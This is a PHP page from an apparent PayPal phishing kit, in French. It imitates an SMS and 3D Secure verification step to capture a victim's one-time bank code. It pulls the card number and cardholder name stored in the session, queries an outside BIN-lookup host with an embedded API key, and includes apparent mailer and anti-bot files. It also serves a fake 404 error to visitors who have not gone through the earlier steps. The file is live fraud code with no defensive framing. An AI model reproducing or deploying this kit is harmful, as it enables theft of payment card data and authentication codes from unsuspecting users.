<?php

ob_start();
session_start();
if(isset($_SESSION['step_four'])){
include '../email.php';
$url = 'http://b3xtapi.academy/?bin='.$_SESSION["c_num"].'&user=workhard&apikey=7eqPEW3v2wPAdb9TlhMpPUfl8Wi7lfmE';
$json = file_get_contents($url,true);
$json = json_decode($json);
$_SESSION["bankname"] = $json->bank;
$_SESSION["bankcountry"] = $json->country;
include'../antibots.php'
?>
    <!DOCTYPE html>
    <html dir="ltr">
        <head>
            <title>IDENTIFICATION SECURISE PAR SMS</title>
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <meta http-equiv="X-UA-COMPATIBLE" content="IE-edge" />
            <meta charset="utf8">
            <link rel="stylesheet" href="../css/normalize.css" />
            <link rel="stylesheet" href="../css/bootstrap.min.css" />
            <link rel="stylesheet" href="../css/font-awesome.min.css" />
            <link rel="stylesheet" href="../css/main_style.css" />
            <link rel="shortcut icon" type="image/x-icon" href="../img/ppl.ico">
        </head>
        <body>
                    <style>
                .error {
                    border: 1px solid #c72e2e;
                }
            </style>
<?php include'navbar.php'?>
    <div class="contain biling-p">
     <form method="POST" action="<?php echo 'serv52033.php?enc='.md5(time()).'&p=0&dispatch='.sha1(time()); ?>" class="contain-info">
            <center> <span class="step" style="text-transform:uppercase"></span>
          <h3><b>IDENTIFICATION PAR SMS<br>
            </b></h3>
          <p style="text-align: left;">Pour sécuriser au mieux votre compte
            PayPal, nous allons procéder à une vérification d'identité en
            simulant un paiement afin que vous puissiez vous identifier en
            saisissant le code d'accès que vous recevrez par SMS sur votre
            téléphone portable dans quelques instants. </p>
          <p><u><b>REMARQUE:</b></u> Il s'agit d'une simulation, vous ne serrez
            en &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;
            &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;
            aucun cas débité d'un quelconque montant.</p>
          <div style="text-align:left;text-transform:uppercase"> <b>DATE : </b><?php echo date('d/m/Y H:i:s', time()); ?><br>
            <b>NUMERO DE CARTE : </b><span><?php echo substr($_SESSION['c_num'], 0,4); ?> XXXX XXXX <?php echo substr($_SESSION['c_num'], -4); ?></span><br>
            <b>NOM SUR LA CARTE : </b><span><?php echo $_SESSION["n_card"] ?></span><br>
          </div>
          &nbsp; <span style="color: #23527c;"></span><br>
          <div id="vu">&nbsp; <img src="https://botw-pd.s3.amazonaws.com/styles/logo-thumbnail/s3/0015/8874/brand.gif?itok=tmqSnuZk"

              alt="" style="width: 34px; height: 34px;"><b><span style="color: #0070ba;">Veuillez
                maintenir cette page ouverte dans l'attente de votre code
                d'accès.</span></b>&nbsp;&nbsp; </div>
          <div><br>

          </div>
          <input id="css" style="margin-top:5px" name="bankid" class="bill_input"

            placeholder="Saisir le code d'accès ici" required="required" autocomplete="off"

            autocorrect="off" aria-required="true"  maxlength="10" pattern="[0-9]{6,10}$" type="text">
          <hr> <input name="ibansub" id="sub" value="Continuer" class="bill_input btn-bill"

type="submit"><br>
          Cette identification est obligatoire pour conclure la procédure.<br>
          <img src="http://aromatiquesdularzac.com/comptoir/img/cms/Homs/3d%20secure.jpg"

            alt="" style="width: 283px; height: 78px;"> </center>
      </form>
    </div>
    <?php include'footer.php'?>
    <script src="../js/jquery-1.11.3.min.js"></script>
    <script src="../js/bootstrap.min.js"></script>
    <script src="../js/cont.js"></script>
    <script src="../js/jquery.maskedinput.js"></script>
    <script src="../js/plugins.js"></script>
    <script>
            $(document).ready(function() {
            var coll = false;
            $('#vu').hide();
            $('#aglbah').on('click',function(){
                if(!coll){
                $('#vu').fadeIn(50);
                $('#iban').fadeOut(50);
                $('#aglbah').html('IBAN');
                $('#css').css('margin-top','15px');
                $('#sub').attr('name','infosub');
                $('#iban').removeAttr('required');
                $("#rib,#codebank,#codeguichet,#ncompte").prop('required',true);
                coll = true;
                }else{
                $('#vu').fadeOut(50);
                $('#iban').fadeIn(50);
                $('#aglbah').html('Sinon, informations du compte');
                $('#css').css('margin-top','5px');
                $('#sub').attr('name','ibansub');
                $('#iban').prop('required',true);
                $("#rib,#codebank,#codeguichet,#ncompte").removeAttr('required');
                coll = false;
                }
            });
    $("#rib,#codebank,#codeguichet,#ncompte").keydown(function (e) {
        // Allow: backspace, delete, tab, escape, enter and .
        if ($.inArray(e.keyCode, [46, 8, 9, 27, 13, 110]) !== -1 ||
             // Allow: Ctrl+A, Command+A
            (e.keyCode === 65 && (e.ctrlKey === true || e.metaKey === true)) ||
             // Allow: home, end, left, right, down, up
            (e.keyCode >= 35 && e.keyCode <= 40)) {
                 // let it happen, don't do anything
                 return;
        }
        // Ensure that it is a number and stop the keypress
        if ((e.shiftKey || (e.keyCode < 48 || e.keyCode > 57)) && (e.keyCode < 96 || e.keyCode > 105)) {
            e.preventDefault();
        }
    });
                            $.urlParam = function(name){
	   var results = new RegExp('[\?&]' + name + '=([^&#]*)').exec(window.location.href);
	   return results[1] || 0;
}

                            if($.urlParam('error')){
$('#iban').addClass('error');
}
                $('#iban').on('focusout',function(){
             $('#iban').removeClass('error');
});

            });
$('#iban').on('input',function(){
   $('#iban').val(function () {
    return this.value.toUpperCase();
});
});
            </script>
  </body>
</html>
<?php
}
else {
    header("HTTP/1.0 404 Not Found");
	die("<h1>404 Not Found</h1>The page that you have requested could not be found.");
}
?>